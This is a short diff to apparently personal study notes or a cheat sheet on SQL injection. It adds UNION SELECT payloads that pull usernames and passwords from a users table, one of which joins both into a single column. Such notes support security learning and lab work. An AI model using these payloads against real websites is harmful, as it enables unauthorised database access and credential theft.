@@ -26,6 +26,13 @@ Find column to a data type
 `' UNION SELECT NULL,'a',NULL,NULL--`
 `' UNION select NULL, 'CqPDHh', NULL  --`
 
+Combining Union to retrieve data.
+`'UNION SELECT username,password from users`
+
+Retrieving multiple value within a single column
+`' UNION SELECT username || '~' || password FROM users--`
+
+
 ```
 Payloads List
 
